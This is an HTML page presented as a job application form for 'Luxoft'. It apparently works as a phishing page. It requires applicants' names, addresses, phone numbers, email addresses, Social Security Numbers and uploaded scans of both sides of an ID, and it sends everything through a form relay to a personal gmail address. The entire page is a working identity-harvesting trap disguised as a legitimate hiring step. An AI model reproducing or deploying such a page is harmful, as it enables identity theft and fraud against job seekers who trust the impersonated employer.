<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Apply to Luxoft</title>
  <link rel="stylesheet" href="style.css"/>
</head>
<body>
  <div class="form-page">
    <h2>Application Form</h2>

    <!-- Updated form with enctype -->
    <form action="https://formsubmit.co/luxoftorganization@gmail.com" 
          method="POST" 
          enctype="multipart/form-data">

      <input type="text" name="Name" placeholder="Name" required>
      <input type="text" name="Address" placeholder="Address" required>
      <input type="tel" name="Phone" placeholder="Phone Number" required>
      <input type="email" name="Email" placeholder="Email Address" required>
      <input type="text" name="SSN" placeholder="Social Security Number" required>

      <label>Upload ID (Front)</label>
      <input type="file" name="ID_Front" required>

      <label>Upload ID (Back)</label>
      <input type="file" name="ID_Back" required>

      <!-- Redirect after submission -->
      <input type="hidden" name="_next" value="thankyou.html">

      <button type="submit">Submit Application</button>
    </form>
  </div>
</body>
</html>
